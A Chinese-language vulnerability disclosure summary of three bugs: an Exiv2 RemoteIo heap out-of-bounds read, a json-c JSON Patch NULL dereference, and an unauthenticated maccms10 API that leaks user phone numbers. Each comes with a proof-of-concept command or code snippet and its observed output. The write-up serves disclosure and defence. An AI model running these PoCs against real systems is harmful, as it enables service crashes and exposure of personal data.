# 漏洞展示内容整理


## 1. Exiv2 RemoteIo 堆越界读

### 漏洞概览

- 项目：Exiv2
- 影响版本：v0.28.8 已确认
- 漏洞类型：Heap Out-of-Bounds Read
- 影响组件：`RemoteIo`
- 触发入口：`exiv2` CLI 处理远程 `http://` CRW 文件
- 验证结论：ASan 确认 `heap-buffer-overflow`
- 主要影响：进程崩溃，可能造成拒绝服务

### 触发链路

```text
远程 HTTP CRW 文件
    -> ImageFactory::open()
    -> RemoteIo::open()
    -> CrwImage::readMetadata()
    -> RemoteIo::read()
    -> populateBlocks(lowBlock, highBlock)
    -> blocksMap_[highBlock] 越界访问
```

关键条件是远程 CRW 文件大小正好是 `RemoteIo` block size 的整数倍。当读取范围结束位置落在 block 边界时，代码把半开区间 `[idx, idx + allow)` 的结束位置错误地当成有效字节位置，导致 `highBlock == nBlocks`。


### 关键代码点

问题出在 `RemoteIo::read()` 的 block 下标计算：

```cpp
size_t highBlock = (p_->idx_ + allow) / p_->blockSize_;
p_->populateBlocks(lowBlock, highBlock);
```

当 `idx + allow` 刚好落在 block 边界时，`highBlock` 会多算一个 block。

### 验证方式

使用 ASan/UBSan 编译 Exiv2 v0.28.8，并启用 `webready/curl`：

```bash
./build-v0.28.8-asan/bin/exiv2 -pa http://127.0.0.1:<port>/<block-aligned-crw>
```

观察到的 ASan 信号：

```text
ERROR: AddressSanitizer: heap-buffer-overflow
Exiv2::BlockMap::isNone()
Exiv2::RemoteIo::Impl::populateBlocks(...)
Exiv2::RemoteIo::read(...)
Exiv2::CrwImage::readMetadata()
```

### 影响分析

如果服务端或客户端程序使用 Exiv2 处理攻击者可控的远程图片 URL，攻击者可提供特定大小的 CRW 文件触发崩溃。当前已确认拒绝服务风险，进一步利用可能性未评估。

## 2. json-c JSON Patch 空指针解引用

### 漏洞概览

- 项目：json-c
- 漏洞类型：NULL Pointer Dereference
- 影响函数：`json_patch_apply()`
- 触发条件：JSON Patch 中 `op`、`from`、`path` 等字段被设置为 `null`
- 验证结论：PoC 可触发进程崩溃
- 主要影响：处理不可信 JSON Patch 的应用可能被打崩，造成拒绝服务

### 触发链路

```text
攻击者控制 JSON Patch 输入
    -> json_patch_apply()
    -> json_object_get_string()
    -> 返回 NULL
    -> strcmp / strlen / strncmp
    -> NULL pointer dereference
```

### 关键代码点

代码只检查字段是否存在，没有检查字段类型是否为字符串。字段为 JSON `null` 时，`json_object_get_string()` 返回 `NULL`，随后被传入字符串函数：

```text
json_patch.c:322  op = json_object_get_string(jop)
json_patch.c:329  strcmp(op, "test")
json_patch.c:211  from_s = json_object_get_string(jfrom)
json_patch.c:213  strlen(from_s)
```

### 验证方式

使用最小 C 程序调用 `json_patch_apply()`：

```c
struct json_object *base = json_tokener_parse("{\"a\":1}");
struct json_object *patch = json_tokener_parse("[{\"op\":null,\"path\":\"/a\"}]");
json_patch_apply(NULL, patch, &base, &err);
```

运行后可观察到：

```text
SIGSEGV
strcmp()
json_patch_apply()
```

### 影响分析

如果上层应用允许用户提交 JSON Patch，并直接调用 `json_patch_apply()`，攻击者可以通过合法 JSON 结构中的 `null` 字段触发崩溃。该问题主要影响可用性，风险表现为拒绝服务。


- 类型不合法时返回错误，而不是继续调用字符串函数。
- 增加回归测试，覆盖 `op:null`、`from:null`、`path:null`。

## 3. maccms10 未认证公开 API 泄露用户联系信息

### 漏洞概览

- 项目：maccms10
- 漏洞类型：Information Disclosure
- 影响接口：`GET /api.php/user/get_list`
- 相关接口：`GET /api.php/user/get_detail?id=<user_id>`
- 触发条件：默认公开 API 配置开启
- 验证结论：未认证请求可获取用户列表和手机号
- 主要影响：泄露注册用户手机号等个人信息

### 触发链路

```text
未认证远程用户
    -> GET /api.php/user/get_list?limit=20
    -> api.php 进入 api 模块
    -> User.php 构造函数调用 check_config()
    -> 默认 publicapi.status=1 且 charge=0
    -> get_list()
    -> 返回 user_phone 等字段
```

默认配置中公开 API 是开启状态：

```php
'publicapi' => [
  'status' => '1',
  'charge' => '0',
  'auth' => '',
]
```

`get_list()` 返回字段包含手机号：

```php
$field = 'user_id,user_name,user_nick_name,user_phone,user_reg_time';
```

### 验证方式

在默认配置的本地测试环境中，不登录直接请求：

```bash
curl -i "http://127.0.0.1:8010/api.php/user/get_list?limit=20"
```

响应包含用户信息：

```json
{
  "user_id": 1,
  "user_name": "poc_user",
  "user_nick_name": "PoC User",
  "user_phone": "13800138000",
  "user_reg_time": 1784007963
}
```

该请求不需要 session cookie、Bearer token、管理员登录态或 CSRF token。

### 影响分析

攻击者可在未认证情况下枚举用户列表，并获取手机号等个人信息。源码显示 `get_detail` 也未做认证，理论上可能暴露更多用户账户字段。该问题对真实站点的影响取决于 public API 是否暴露在公网以及用户数据规模。
